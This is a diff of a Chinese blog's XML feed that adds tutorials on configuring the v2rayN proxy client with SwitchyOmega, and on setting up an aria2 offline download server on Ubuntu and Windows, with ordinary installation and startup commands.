src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234217.png" alt=""></p>
+<h4 id="安装v2rayN客户端-1"><a href="#安装v2rayN客户端-1" class="headerlink" title="安装v2rayN客户端"></a>安装v2rayN客户端</h4><ol>
+<li><p>之后我们将两个压缩包解压至<strong>同一个文件夹</strong>中,该文件夹路径则为软件安装路径.<br><em>注:此处两个压缩包的文件要放在同一个文件夹下面,若提示存在相同文件,覆盖就行</em></p>
+</li>
+<li><p>双击文件夹下的<code>v2rayN.exe</code>程序,在电脑右下角小托盘处找到图标后打开主界面:<br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234227.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234249.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234328.png" alt=""></p>
+</li>
+</ol>
+<hr>
+<h4 id="配置v2rayN客户端-1"><a href="#配置v2rayN客户端-1" class="headerlink" title="配置v2rayN客户端"></a>配置v2rayN客户端</h4><h5 id="导入服务端-1"><a href="#导入服务端-1" class="headerlink" title="导入服务端"></a>导入服务端</h5><p>复制我们在v2ray服务端配置中获得的vmess链接,依次点击<code>服务器--&gt;从剪贴板导入批量URL</code>.<br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234347.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234419.png" alt=""></p>
+<hr>
+<hr>
+<p><strong><em>注:从此处开始和上面完全不一样!!!</em></strong><br><strong><em>注:从此处开始和上面完全不一样!!!</em></strong><br><strong><em>注:从此处开始和上面完全不一样!!!</em></strong></p>
+<hr>
+<hr>
+<h5 id="参数设置-1"><a href="#参数设置-1" class="headerlink" title="参数设置"></a>参数设置</h5><p><strong>基础设置:</strong> 在<code>Core:基础设置--&gt;http代理--仅开启http代理,不改变系统代理</code>.<br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234459.png" alt=""></p>
+<hr>
+<h3 id="SwitchyOmega配置"><a href="#SwitchyOmega配置" class="headerlink" title="SwitchyOmega配置"></a>SwitchyOmega配置</h3><h4 id="下载SwitchyOmega插件"><a href="#下载SwitchyOmega插件" class="headerlink" title="下载SwitchyOmega插件"></a>下载SwitchyOmega插件</h4><p>插件下载地址: <a href="https://github.com/FelisCatus/SwitchyOmega/releases/latest" target="_blank" rel="noopener">GitHub</a>&nbsp; &nbsp;&nbsp;&nbsp;<a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif" target="_blank" rel="noopener">Chrome商店</a></p>
+<h4 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h4><p>安装方法详情见 : <a href="https://www.yuanhe-xia.cn/doc/1720/">浏览器插件如何安装</a> </p>
+<hr>
+<h4 id="配置SwitchyOmega插件"><a href="#配置SwitchyOmega插件" class="headerlink" title="配置SwitchyOmega插件"></a>配置SwitchyOmega插件</h4><h5 id="导入备份配置文件"><a href="#导入备份配置文件" class="headerlink" title="导入备份配置文件"></a>导入备份配置文件</h5><p><strong>打开插件配置,选择</strong><code>导入/导出--&gt;在线恢复--&gt;恢复</code><br><strong>在线恢复网址为:</strong><a href="https://raw.githubusercontent.com/wiki/FelisCatus/SwitchyOmega/GFWList.bak" target="_blank" rel="noopener">https://raw.githubusercontent.com/wiki/FelisCatus/SwitchyOmega/GFWList.bak</a><br><em>(若提示失败多重试几遍,实在不行可选择从备份文件恢复,备份文件下载地址:<a href="https://yuanhe-xia.lanzous.com/iXfrVez3i6b" target="_blank" rel="noopener">蓝奏云</a>)</em><br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234514.png" alt=""></p>
+<h5 id="代理服务器设置"><a href="#代理服务器设置" class="headerlink" title="代理服务器设置"></a>代理服务器设置</h5><p>依次选中<code>情景模式--&gt;GFWed</code>,配置<code>http</code>代理协议和<code>10809</code>代理端口<br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234528.png" alt=""></p>
+<h5 id="情景模式设置"><a href="#情景模式设置" class="headerlink" title="情景模式设置"></a>情景模式设置</h5><p>依次选中 <code>情景模式--&gt;自动切换</code> ,下滑到 <code>规则列表设置</code>,点击 <code>立即更新情景模式</code>  <em>(若提示更新失败,多点几次)</em><br><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234538.png" alt=""></p>
+<h3 id="插件使用"><a href="#插件使用" class="headerlink" title="插件使用"></a>插件使用</h3><p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823234557.png" alt=""></p>
+]]></content>
+      <categories>
+        <category>杂项</category>
+      </categories>
+      <tags>
+        <tag>其他</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>aria2离线下载服务器搭建(Ubuntu环境下)</title>
+    <url>/doc/3686/</url>
+    <content><![CDATA[<blockquote>
+<p>环境说明:</p>
+<ul>
+<li>window7</li>
+<li>Ubuntu 18.04.4 LTS</li>
+</ul>
+</blockquote>
+<a id="more"></a>
+
+<hr>
+<h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>大致讲一下aria2实现离线下载服务器的流程:</p>
+<ol>
+<li>将aria2c这个下载工具以<strong>守护进程</strong>方式启动.</li>
+<li>前者启动后会默认使用<strong>当前用户家目录</strong>下<code>~/.aria2/aria2.conf</code>文件中的配置.如果想指定配置文件路径,则需使用<code>--conf-path=&lt;PATH&gt;</code>参数.</li>
+</ol>
+<p>综上所述,搭建离线下载服务器简单来说就三步:<br>3. <strong>安装</strong>aria2.<br>4. <strong>配置</strong>好所需要的配置文件. <em>(例:下载路径,外部访问端口…)</em><br>5. 以守护进程模式<strong>启动</strong>它. <em>(为防止幺蛾子最好指定配置文件路径)</em></p>
+<hr>
+<h3 id="Linux环境"><a href="#Linux环境" class="headerlink" title="Linux环境"></a>Linux环境</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahant@yuanhe:~$ sudo apt-get install aria2 -y<br></code></pre></td></tr></table></figure>
+<hr>
+<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>下载配置文件: <a href="http://aria2c.com/archiver/aria2.conf" target="_blank" rel="noopener">aria2c</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@yuanhe:~$ mkdir ~/.aria2<br>xiahan@yuanhe:~$ wget http://aria2c.com/archiver/aria2.conf -O ~/.aria2/aria2.conf<br></code></pre></td></tr></table></figure>
+<p>创建会话文件<code>/etc/aria2/aria2.session</code></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@yuanhe:~$ mkdir /etc/aria2<br>xiahan@yuanhe:~$ touch /etc/aria2/aria2.session<br></code></pre></td></tr></table></figure>
+<hr>
+<h4 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h4><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@yuanhe:~$ aria2c --conf-path ~/.aria2/aria2.conf -D<br></code></pre></td></tr></table></figure>
+
+
+<h4 id="验证-重启"><a href="#验证-重启" class="headerlink" title="验证,重启"></a>验证,重启</h4><p>验证:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@yuanhe:~$ ps -A|grep aria2c<br> 9555 ?        00:00:00 aria2c<br></code></pre></td></tr></table></figure>
+<p>重启:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">xiahan@yuanhe:~$ ps -A|grep aria2c                        <br> 9555 ?        00:00:00 aria2c                          <br>xiahan@yuanhe:~$ <span class="hljs-built_in">kill</span> -9 9555                             <br>xiahan@yuanhe:~$ aria2c --conf-path ~/.aria2/aria2.conf -D<br></code></pre></td></tr></table></figure>
+
+<br>
+
+
+
+<hr>
+<hr>
+<h3 id="windows环境"><a href="#windows环境" class="headerlink" title="windows环境"></a>windows环境</h3><h4 id="安装-配置-启动"><a href="#安装-配置-启动" class="headerlink" title="安装,配置,启动"></a>安装,配置,启动</h4><p>windows下就简单的多了.<br>下载:<a href="http://aria2c.com/archiver/aria2.zip" target="_blank" rel="noopener">懒人包</a><br>下载完成后解压,双击<code>aria2.exe</code>就行了 <em>注:不是 aria2c.exe</em><br><br></p>
+<h4 id="升级"><a href="#升级" class="headerlink" title="升级"></a>升级</h4><p>下载 <a href="https://github.com/aria2/aria2/releases/latest" target="_blank" rel="noopener">aria2最新版本</a>中的<code>xxxxx-xxxxxx-win-64bit-build1.zip</code>文件,将其中的<code>aria2c.exe</code>覆盖掉懒人包中的<code>&#39;aria2c.exe</code></p>
+<br>
+
+<hr>
+<hr>
+<h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><h3 id="谷歌插件"><a href="#谷歌插件" class="headerlink" title="谷歌插件"></a>谷歌插件</h3><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><p>在线安装 : <a href="https://chrome.google.com/webstore/detail/aria2-for-chrome/mpkodccbngfoacfalldjimigbofkhgjn" target="_blank" rel="noopener">谷歌商店</a></p>
+<p>离线安装 : <a href="https://yuanhe-xia.lanzous.com/b0c2n6amb" target="_blank" rel="noopener">蓝奏云</a>       提取码 : ag1w </p>
+<p>安装方法详情见 : <a href="https://www.yuanhe-xia.cn/doc/1720/">浏览器插件如何安装</a> </p>
+<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><ol>
+<li><p>单击插件点开插件设置页.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823232355.png" alt=""></p>
+</li>
+<li><p>依次配置插件设置.(第7步错了,设置完后刷新页面激活)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823232409.png" alt=""></p>
+</li>
+<li><p>全部设置完后如图.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/yuanhe-xia/ImageHost/imgs/20200823232414.png" alt=""></p>
+</li>
+</ol>
+<hr>
+<h3 id="网页"><a href="#网页" class="headerlink" title="网页"></a>网页</h3><p>网址:<a href="https://aria2c.com/" target="_blank" rel="noopener">Aria2 Web 控制台</a></p>
+<p>设置:<code>扳手图标--&gt;JSON-RPC Path</code></p>
+<hr>
+<h3 id="app"><a href="#app" class="headerlink" title="app"></a>app</h3><p>安卓 : </p>
+<p>​    下载地址 : <a href="https://github.com/devgianlu/Aria2App/releases/latest" target="_blank" rel="noopener">GitHub</a>   <a href="https://play.google.com/store/apps/details?id=com.gianlu.aria2app&pcampaignid=MKT-Other-global-all-co-prtnr-py-PartBadge-Mar2515-1" target="_blank" rel="noopener">play商店</a>   <a href="https://yuanhe-xia.lanzous.com/iiKV5fnlchi" target="_blank" rel="noopener">蓝奏云</a></p>
 ]]></content>
       <categories>
         <category>杂项</category>
